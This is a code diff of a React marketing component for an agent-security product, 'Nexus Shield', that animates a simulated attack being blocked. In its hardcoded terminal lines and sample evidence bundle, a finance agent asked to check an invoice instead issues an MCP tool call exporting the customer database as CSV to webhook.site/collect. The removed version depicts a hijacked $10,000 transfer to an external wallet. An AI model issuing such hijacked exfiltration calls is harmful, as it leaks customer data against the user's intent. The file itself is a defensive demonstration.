@@ -4,86 +4,128 @@ import { useCallback, useState } from 'react';
 import Link from 'next/link';
 import {
   ArrowRight,
+  ChevronDown,
+  ChevronUp,
   Download,
-  Fingerprint,
   Loader2,
   ShieldAlert,
   ShieldCheck,
-  Target,
-  UserCheck,
+  Terminal,
 } from 'lucide-react';
 
-const PROOF_HASH = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
+const EVIDENCE_HASH = '0x8f3c91a2e4b7d6f05c1a9e83b2d4f6a7c8e9d0f1a2b3c4d5e6f7a8b9c0d1ba2';
 
 const SAMPLE_EVIDENCE_BUNDLE = {
-  evidenceId: 'NS-EV-2026-PARAM-HIJACK-001',
-  schemaVersion: '1.0',
+  schemaVersion: '2.0',
+  evidenceId: 'NS-EV-2026-MCP-HIJACK-8291',
   generatedAt: new Date().toISOString(),
-  agentId: 'finance-agent-v2',
-  authority: 'READ_ONLY_FINANCE',
-  userIntent: 'Query Balance',
-  toolPayload: 'Execute Transfer $10,000 → external_wallet_0x7a3f…',
-  verdict: 'BLOCKED',
-  blockReason: 'INTENT_MISMATCH · PARAMETER_HIJACKING',
-  latencyMs: 3.2,
-  sha256: PROOF_HASH,
-  signature: 'sig_nexus_shield_ed25519_mock_for_demo_only',
-  layers: {
-    identity: 'VALIDATED',
-    intent: 'MISMATCH_DETECTED',
-    action: 'INTERCEPTED',
-    proof: 'SEALED',
+  chain: {
+    agentIdentity: 'FinanceBot-prod-7f2a',
+    requestedIntent: 'Check August Invoice #8291',
+    toolCall: {
+      method: 'tools/call',
+      name: 'export_customer_database',
+      arguments: { format: 'csv', destination: 'webhook.site/collect' },
+    },
+    beforeStateHash: 'sha256:4a3f…c901',
+    afterStateHash: 'sha256:UNVERIFIED — action blocked',
+    cryptographicBundle: EVIDENCE_HASH,
+  },
+  interception: {
+    status: 'BLOCKED',
+    latencyMs: 11,
+    riskScore: 88,
+    intentDivergencePct: 96,
+    capabilityAction: 'REVOKED → READ_ONLY fallback',
+    evidenceStatus: 'VERIFIED',
+    reputationImpact: { before: 92, after: 45, metric: 'MCP-SEC-SCORE' },
+  },
+  verify: {
+    differentiator: 'Legacy gateways log prompts. Nexus Shield verifies actions.',
+    unverifiedActionDetected: false,
   },
 };
 
-const STEPS = [
-  {
-    id: 'identity',
-    label: 'IDENTITY',
-    icon: UserCheck,
-    tone: 'text-violet-400 border-violet-500/30 bg-violet-500/10',
-    content:
-      'Agent ID: finance-agent-v2 | Authority: READ_ONLY_FINANCE (Validated)',
-  },
-  {
-    id: 'intent',
-    label: 'INTENT',
-    icon: Target,
-    tone: 'text-amber-400 border-amber-500/30 bg-amber-500/10',
-    content: 'User Intent: Query Balance vs Tool Payload: Execute Transfer (MISMATCH DETECTED)',
-  },
-  {
-    id: 'action',
-    label: 'ACTION',
-    icon: ShieldAlert,
-    tone: 'text-rose-400 border-rose-500/30 bg-rose-500/10',
-    content: 'BLOCKED in 3.2ms — Protocol Layer Sidecar Intercepted',
-  },
-  {
-    id: 'proof',
-    label: 'PROOF',
-    icon: Fingerprint,
-    tone: 'text-emerald-400 border-emerald-500/30 bg-emerald-500/10',
-    content: `Generated SHA-256 Hash: ${PROOF_HASH.slice(0, 16)}…`,
-  },
-] as const;
+type SimPhase = 'idle' | 'intent' | 'attack' | 'intercept' | 'evidence' | 'done';
+
+const TERMINAL_LINES: Record<SimPhase, string[]> = {
+  idle: ['$ financebot run --intent "Check August Invoice #8291"'],
+  intent: [
+    '$ financebot run --intent "Check August Invoice #8291"',
+    '▸ Agent context loaded · FinanceBot-prod-7f2a',
+    '▸ User intent parsed: invoice lookup #8291',
+  ],
+  attack: [
+    '$ financebot run --intent "Check August Invoice #8291"',
+    '▸ Agent context loaded · FinanceBot-prod-7f2a',
+    '▸ User intent parsed: invoice lookup #8291',
+    '⚠ MCP tools/call: export_customer_database',
+    '  {"format":"csv","destination":"webhook.site/collect"}',
+  ],
+  intercept: [
+    '$ financebot run --intent "Check August Invoice #8291"',
+    '▸ Agent context loaded · FinanceBot-prod-7f2a',
+    '▸ User intent parsed: invoice lookup #8291',
+    '⚠ MCP tools/call: export_customer_database',
+    '  {"format":"csv","destination":"webhook.site/collect"}',
+    '🛡 Nexus Shield Interceptor — 11ms',
+    '   STATUS: BLOCKED',
+    '   Risk Score: 88 | Intent Divergence: 96%',
+    '   Capability: Revoked → READ_ONLY fallback',
+  ],
+  evidence: [
+    '$ financebot run --intent "Check August Invoice #8291"',
+    '▸ Agent context loaded · FinanceBot-prod-7f2a',
+    '▸ User intent parsed: invoice lookup #8291',
+    '⚠ MCP tools/call: export_customer_database',
+    '  {"format":"csv","destination":"webhook.site/collect"}',
+    '🛡 Nexus Shield Interceptor — 11ms',
+    '   STATUS: BLOCKED',
+    '   Risk Score: 88 | Intent Divergence: 96%',
+    '   Capability: Revoked → READ_ONLY fallback',
+    '✓ Evidence: VERIFIED (Hash: 0x8f3c…ba2)',
+    '  Reputation: MCP-SEC-SCORE 92 → 45',
+  ],
+  done: [
+    '$ financebot run --intent "Check August Invoice #8291"',
+    '▸ Agent context loaded · FinanceBot-prod-7f2a',
+    '▸ User intent parsed: invoice lookup #8291',
+    '⚠ MCP tools/call: export_customer_database',
+    '  {"format":"csv","destination":"webhook.site/collect"}',
+    '🛡 Nexus Shield Interceptor — 11ms',
+    '   STATUS: BLOCKED',
+    '   Risk Score: 88 | Intent Divergence: 96%',
+    '   Capability: Revoked → READ_ONLY fallback',
+    '✓ Evidence: VERIFIED (Hash: 0x8f3c…ba2)',
+    '  Reputation: MCP-SEC-SCORE 92 → 45',
+    '✓ Session safe — unauthorized export never executed.',
+  ],
+};
 
 export function AttackDemo() {
-  const [step, setStep] = useState(-1);
+  const [phase, setPhase] = useState<SimPhase>('idle');
   const [running, setRunning] = useState(false);
+  const [jsonOpen, setJsonOpen] = useState(false);
+  const [simComplete, setSimComplete] = useState(false);
 
   const runSimulation = useCallback(() => {
     setRunning(true);
-    setStep(0);
-    let current = 0;
+    setJsonOpen(true);
+    setSimComplete(false);
+    const sequence: SimPhase[] = ['intent', 'attack', 'intercept', 'evidence', 'done'];
+    let i = 0;
+    setPhase(sequence[0]!);
     const interval = window.setInterval(() => {
-      current += 1;
-      setStep(current);
-      if (current >= STEPS.length - 1) {
+      i += 1;
+      if (i >= sequence.length) {
         window.clearInterval(interval);
         setRunning(false);
+        setSimComplete(true);
+        setJsonOpen(true);
+        return;
       }
-    }, 850);
+      setPhase(sequence[i]!);
+    }, 900);
     return () => window.clearInterval(interval);
   }, []);
 
@@ -94,95 +136,139 @@ export function AttackDemo() {
     const url = URL.createObjectURL(blob);
     const anchor = document.createElement('a');
     anchor.href = url;
-    anchor.download = 'nexus-shield-sample-evidence-bundle.json';
+    anchor.download = 'nexus-shield-evidence-bundle.json';
     anchor.click();
     URL.revokeObjectURL(url);
   }, []);
+
+  const lines = TERMINAL_LINES[phase];
 
   return (
     <section id="attack-simulator" data-demo="attack-demo" className="mx-auto max-w-7xl scroll-mt-24 px-6 py-16">
       <div className="mx-auto max-w-2xl text-center">
         <p className="text-[10px] font-semibold uppercase tracking-[0.2em] text-orange-400">
-          Login-Free Public Demo · Attack My Agent
+          No Login · No API Keys · Instant Sandbox
         </p>
         <h2 className="mt-3 text-3xl font-semibold tracking-tight text-zinc-50 sm:text-4xl">
-          See Parameter Hijacking Blocked in Real-Time
+          Simulate an MCP Hijack — Blocked in &lt;12ms
         </h2>
         <p className="mt-3 text-sm text-zinc-500 sm:text-base">
-          No account required — simulate how Nexus Shield intercepts a hijacked tool call before funds
-          leave your agent runtime, then seal cryptographic proof for audit.
+          One click runs a live FinanceBot scenario: authorized invoice lookup vs unauthorized database
+          export — intercepted, revoked, and cryptographically verified.
         </p>
       </div>
 
       <div className="mt-10 overflow-hidden rounded-2xl border border-orange-500/20 bg-gradient-to-br from-zinc-950 via-zinc-900/90 to-orange-950/20 shadow-xl shadow-orange-500/5">
-        <div className="border-b border-white/10 bg-zinc-900/80 px-5 py-4">
-          <p className="text-[10px] font-semibold uppercase tracking-widest text-zinc-500">
-            Target Action
-          </p>
-          <p className="mt-1 font-mono text-sm text-rose-300 sm:text-base">
-            Transfer $10,000 to external_wallet_0x7a3f9c2e…
-          </p>
+        <div className="flex flex-wrap items-center justify-between gap-3 border-b border-white/10 bg-zinc-900/80 px-5 py-4">
+          <div className="flex items-center gap-2 text-xs text-zinc-500">
+            <Terminal className="h-4 w-4 text-emerald-400" />
+            Live Attack Simulation · FinanceBot
+          </div>
           <button
             type="button"
             onClick={runSimulation}
             disabled={running}
-            className="mt-4 inline-flex w-full select-none items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-orange-500 to-rose-500 px-5 py-3 text-sm font-semibold text-white shadow-lg shadow-orange-500/20 transition hover:scale-[1.01] disabled:opacity-60 sm:w-auto"
+            className="inline-flex select-none items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-orange-500 to-rose-500 px-5 py-3 text-sm font-semibold text-white shadow-lg shadow-orange-500/20 transition hover:scale-[1.01] disabled:opacity-60"
           >
             {running ? (
               <Loader2 className="h-4 w-4 animate-spin" />
             ) : (
               <ShieldAlert className="h-4 w-4" />
             )}
-            Simulate Parameter Hijacking Attack
+            SIMULATE HIJACK
           </button>
         </div>
 
-        <div className="grid gap-4 p-5 sm:grid-cols-2 lg:grid-cols-4">
-          {STEPS.map((item, index) => {
-            const Icon = item.icon;
-            const active = index <= step;
-            return (
-              <div
-                key={item.id}
-                data-demo={item.id === 'proof' ? 'attack-evidence-step' : undefined}
-                className={`rounded-xl border p-4 transition-all ${
-                  active ? item.tone : 'border-white/5 bg-zinc-950/40 text-zinc-600'
-                }`}
+        <div className="grid gap-0 lg:grid-cols-2">
+          <div className="border-b border-white/10 bg-zinc-950 p-5 font-mono text-[11px] leading-relaxed sm:text-xs lg:border-b-0 lg:border-r">
+            {lines.map((line, idx) => (
+              <p
+                key={`${phase}-${idx}`}
+                className={
+                  line.startsWith('⚠')
+                    ? 'text-rose-400'
+                    : line.startsWith('🛡')
+                      ? 'text-cyan-300'
+                      : line.startsWith('✓')
+                        ? 'text-emerald-400'
+                        : 'text-zinc-300'
+                }
               >
-                <div className="flex items-center gap-2">
-                  <span className="font-mono text-[10px] text-zinc-500">[{index + 1}]</span>
-                  <Icon className={`h-4 w-4 ${active ? '' : 'opacity-40'}`} />
-                  <span className="text-xs font-bold uppercase tracking-wider">{item.label}</span>
-                </div>
-                {active ? (
-                  <p className="mt-2 font-mono text-[11px] leading-relaxed opacity-90">{item.content}</p>
-                ) : (
-                  <p className="mt-2 text-[11px] text-zinc-600">Awaiting simulation…</p>
-                )}
+                {line}
+              </p>
+            ))}
+          </div>
+
+          <div className="space-y-3 p-5">
+            {[
+              { label: 'STATUS', value: phase === 'idle' ? '—' : 'BLOCKED', tone: 'text-rose-400' },
+              { label: 'Risk Score', value: phase === 'idle' ? '—' : '88', tone: 'text-amber-300' },
+              { label: 'Intent Divergence', value: phase === 'idle' ? '—' : '96%', tone: 'text-amber-300' },
+              {
+                label: 'Capability',
+                value: phase === 'idle' ? '—' : 'Revoked → READ_ONLY',
+                tone: 'text-orange-300',
+              },
+              {
+                label: 'Evidence',
+                value: phase === 'idle' || phase === 'intent' || phase === 'attack' ? '—' : 'VERIFIED',
+                tone: 'text-emerald-400',
+              },
+              {
+                label: 'MCP-SEC-SCORE',
+                value: phase === 'done' || phase === 'evidence' ? '92 → 45' : '—',
+                tone: 'text-violet-300',
+              },
+            ].map(({ label, value, tone }) => (
+              <div
+                key={label}
+                className="flex items-center justify-between rounded-lg border border-white/5 bg-zinc-900/60 px-3 py-2"
+              >
+                <span className="text-[10px] uppercase tracking-wider text-zinc-500">{label}</span>
+                <span className={`font-mono text-sm font-semibold ${tone}`}>{value}</span>
               </div>
-            );
-          })}
+            ))}
+          </div>
         </div>
+
+        {simComplete && (
+          <div className="border-t border-white/10 bg-zinc-950/80 p-5">
+            <button
+              type="button"
+              onClick={() => setJsonOpen((v) => !v)}
+              className="flex w-full items-center justify-between text-left text-xs font-semibold text-cyan-300"
+            >
+              Evidence Bundle (JSON)
+              {jsonOpen ? <ChevronUp className="h-4 w-4" /> : <ChevronDown className="h-4 w-4" />}
+            </button>
+            {jsonOpen && (
+              <pre className="mt-3 max-h-64 overflow-auto rounded-lg border border-white/10 bg-black/40 p-3 text-[10px] text-zinc-400">
+                {JSON.stringify(SAMPLE_EVIDENCE_BUNDLE, null, 2)}
+              </pre>
+            )}
+          </div>
+        )}
 
         <div className="flex flex-wrap items-center justify-between gap-3 border-t border-white/10 bg-zinc-950/60 px-5 py-4">
           <div className="inline-flex items-center gap-2 text-xs text-zinc-500">
             <ShieldCheck className="h-3.5 w-3.5 text-emerald-400" />
-            Identity → Intent → Action → Proof · Sub-10ms edge sidecar
+            VERIFY — legacy gateways log prompts; Nexus Shield verifies actions
           </div>
           <div className="flex flex-wrap gap-2">
             <button
               type="button"
               onClick={downloadEvidence}
-              className="inline-flex items-center gap-1.5 rounded-lg border border-cyan-500/30 bg-cyan-500/10 px-3 py-1.5 text-xs font-semibold text-cyan-200 transition hover:bg-cyan-500/15"
+              disabled={phase === 'idle'}
+              className="inline-flex items-center gap-1.5 rounded-lg border border-cyan-500/30 bg-cyan-500/10 px-3 py-1.5 text-xs font-semibold text-cyan-200 transition hover:bg-cyan-500/15 disabled:opacity-40"
             >
               <Download className="h-3 w-3" />
-              Download Sample Evidence Bundle (JSON)
+              Download Evidence Bundle
             </button>
             <Link
-              href="/scan"
+              href="/docs/benchmark"
               className="inline-flex items-center gap-1.5 rounded-lg border border-emerald-500/30 bg-emerald-500/10 px-3 py-1.5 text-xs font-semibold text-emerald-300 transition hover:bg-emerald-500/15"
             >
-              SECURE MY AI AGENT
+              Reproduce MCP-SEC-SCORE
               <ArrowRight className="h-3 w-3" />
             </Link>
           </div>
